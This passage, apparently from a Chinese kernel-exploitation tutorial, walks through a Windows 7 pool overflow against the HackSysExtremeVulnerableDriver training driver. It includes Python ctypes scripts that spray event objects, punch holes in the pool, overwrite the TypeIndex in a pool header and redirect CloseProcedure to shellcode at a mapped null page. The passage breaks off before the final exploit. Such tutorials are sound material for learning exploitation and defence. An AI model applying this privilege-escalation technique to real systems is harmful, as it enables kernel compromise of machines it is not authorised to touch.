
```
import ctypes, sys, struct

from ctypes import *

from subprocess import *



def main():

    kernel32 = windll.kernel32

    ntdll = windll.ntdll



    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)



    if not hevDevice or hevDevice == -1:

        print "*** Couldn't get Device Driver handle."

        sys.exit(0)



    buf = "A"*504

    buf_ad = id(buf) + 20



    spray_event1 = spray_event2 = []



    for i in xrange(10000):

        spray_event1.append(kernel32.CreateEventA(None, False, False, None))

    for i in xrange(5000):

        spray_event2.append(kernel32.CreateEventA(None, False, False, None))



    kernel32.DeviceIoControl(hevDevice, 0x22200f, buf_ad, len(buf), None, 0, byref(c_ulong()), None)



if __name__ == "__main__":

    main()

```

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_XNKDC9V95NS8PH6.png)

我们的`Event`对象被喷射到非分页池中，现在我们需要在这些内存块创造一些空隙，然后把我们有漏洞的Hack缓冲区重新分配到这些空隙中。在重新分配有漏洞的缓冲区后，我们需要破坏相邻的池头部，以指向我们的shellcode地址。`Event`对象的大小为`0x40`个字节（`0x38+0x8`），包括池头部。

### 来分析一下头部：

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_Q26WHMM7YBURZU3.png)

由于`Event`对象被喷射到非分页池中，所以我们可以将这些值加到缓冲区末尾，来实现利用。但是，简单这样做是行不通的，我们来研究下头部的数据结构，再稍作修改：

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_H3QRY8ZF984FNWY.png)

我们感兴趣的部分是`TypeIndex`，它实际上是指针数组中的偏移量大小，它定义了Windows所支持的每个对象的`OBJECT_TYPE`，来分析一下：

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_KS3WS3PQHNVDAH2.png)

这看起来可能有点复杂，但我已经标记出了重要的部分：

- 第一个指针是 `00000000`，在Windows 7下非常重要（下面解释）；
- 下一个突出显示的指针是 `85f05418`， 这是从`0xc`开始的偏移量；
- 分析到这，可以看出这是`Event`对象类型；
- 现在最有趣的是偏移量`0x28`处的`TypeInfo`成员：
  - 这个成员的最后部分有一些程序调用，我们可以从提供的程序中挑选以供己用，在这选择`0x038`处的 `CloseProcedure`
  - `CloseProcedure`的偏移量为 `0x28 + 0x38 = 0x60`
  - 我们会覆盖`0x60`处的这个指针，让它指向我们的shellcode地址，然后调用`CloseProcedure`方法，从而最终执行我们的shellcode。

我们的目标是把`TypeIndex`的偏移量从`0xc`改为`0x0`，因为第一个指针是空指针，在Windows 7 中有一个漏洞，可以调用 [`NtAllocateVirtualMemory`](https://bbs.kanxue.com/ntallocatevitualmemory)来映射到Null页面：

```
NTSTATUS ZwAllocateVirtualMemory(

  _In_    HANDLE    ProcessHandle,

  _Inout_ PVOID     *BaseAddress,

  _In_    ULONG_PTR ZeroBits,

  _Inout_ PSIZE_T   RegionSize,

  _In_    ULONG     AllocationType,

  _In_    ULONG     Protect

);

```

然后调用[`WriteProcessMemory`](https://bbs.kanxue.com/writeprocessmemory)覆盖`0x60`处的指针，指向shellcode地址:

```
BOOL WINAPI WriteProcessMemory(

  _In_  HANDLE  hProcess,

  _In_  LPVOID  lpBaseAddress,

  _In_  LPCVOID lpBuffer,

  _In_  SIZE_T  nSize,

  _Out_ SIZE_T  *lpNumberOfBytesWritten

);

```

把所有的内容整合一下，python脚本大体如下：

```
import ctypes, sys, struct

from ctypes import *

from subprocess import *



def main():

    kernel32 = windll.kernel32

    ntdll = windll.ntdll



    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)



    if not hevDevice or hevDevice == -1:

        print "*** Couldn't get Device Driver handle."

        sys.exit(0)



    ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000, 0x40)



    shellcode = "\x90" * 8

    shellcode_address = id(shellcode) + 20



    kernel32.WriteProcessMemory(0xFFFFFFFF, 0x60, byref(c_void_p(shellcode_address)), 0x4, byref(c_ulong()))



    buf = "A" * 504

    buf += struct.pack("L", 0x04080040)

    buf += struct.pack("L", 0xEE657645)

    buf += struct.pack("L", 0x00000000)

    buf += struct.pack("L", 0x00000040)

    buf += struct.pack("L", 0x00000000)

    buf += struct.pack("L", 0x00000000)

    buf += struct.pack("L", 0x00000001)

    buf += struct.pack("L", 0x00000001)

    buf += struct.pack("L", 0x00000000)

    buf += struct.pack("L", 0x00080000)

    buf_ad = id(buf) + 20



    spray_event1 = spray_event2 = []



    for i in xrange(10000):

        spray_event1.append(kernel32.CreateEventA(None, False, False, None))

    for i in xrange(5000):

        spray_event2.append(kernel32.CreateEventA(None, False, False, None))



    for i in xrange(0, len(spray_event2), 16):

        for j in xrange(0, 8, 1):

            kernel32.CloseHandle(spray_event2[i+j])



    kernel32.DeviceIoControl(hevDevice, 0x22200f, buf_ad, len(buf), None, 0, byref(c_ulong()), None)



if __name__ == "__main__":

    main()

```

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_YJBPTZAETWVBQRB.png)

有漏洞的缓冲区现在位于我们创建的`Event`对象之间的空隙中。

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_YFZEVHRF7A9CE28.png)

`TypeIndex`由 `0xc` 修改为 `0x0`

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_8GEUQ8JA8GQZRBS.png)

shellcode地址布置完成！

现在，只需要调用 `Closeprocedure`，在 虚拟内存中 加载shellcode， shellcode应该完美运行。最终版本的exploit如下：
